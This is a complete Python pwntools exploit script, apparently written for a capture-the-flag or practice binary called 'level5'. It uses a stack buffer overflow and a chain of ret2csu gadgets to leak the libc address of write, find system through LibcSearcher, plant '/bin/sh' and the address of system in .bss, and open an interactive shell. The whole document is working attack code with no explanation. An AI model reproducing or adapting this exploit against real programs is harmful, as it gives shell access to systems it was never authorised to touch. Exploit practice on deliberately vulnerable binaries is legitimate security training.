from pwn import *
from LibcSearcher import LibcSearcher

elf = ELF('level5')
p = process('./level5')
gdb.attach(p)
got_write = elf.got['write']
got_read = elf.got['read']
main_addr = 0x400564
bss_addr=0x601028
payload1 =  "\x00"*136 + p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write) + p64(8) + p64(0x4005F0) + "\x00"*56 + p64(main_addr)
p.recvuntil("Hello, World\n")
print "\n#############sending payload1#############\n"
p.sendline(payload1)
sleep(1)
write_addr = u64(p.recv(8))
print "write_addr: " + hex(write_addr)
libc=LibcSearcher('write',write_addr)
libc_base=write_addr-libc.dump('write')
sys_addr=libc_base+libc.dump('system')
print "system_addr: " + hex(sys_addr)
p.recvuntil("Hello, World\n")
payload2 =  "\x00"*136 + p64(0x400606) + p64(0) + p64(0) + p64(1) + p64(got_read) + p64(0) + p64(bss_addr) + p64(16) + p64(0x4005F0) + "\x00"*56 + p64(main_addr)
print "\n#############sending payload2#############\n"
p.send(payload2)
sleep(1)
p.send(p64(sys_addr))
p.sendline("/bin/sh")
sleep(1)
p.recvuntil("Hello, World\n")
payload3 =  "\x00"*136 + p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(bss_addr) + p64(bss_addr+8) + p64(0) + p64(0) + p64(0x4005F0) + "\x00"*56 + p64(main_addr)
print "\n#############sending payload3#############\n"
sleep(1)
p.send(payload3)
p.interactive()
